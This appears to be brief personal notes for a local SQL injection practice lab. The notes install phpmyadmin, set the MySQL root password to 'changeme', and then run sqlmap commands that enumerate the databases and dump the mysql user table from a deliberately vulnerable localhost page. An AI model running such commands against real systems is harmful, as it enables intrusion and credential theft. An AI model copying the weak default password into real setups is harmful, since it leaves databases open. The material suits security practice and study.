
apt-get install gedit phpmyadmin

mysql
use mysql 
update user set password=PASSWORD("changeme") where User='root';
flush privileges;

then http://localhost/phpmyadmin/


sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= --dbs

sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= -D mysql --tables

sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= -D mysql -T user --dump


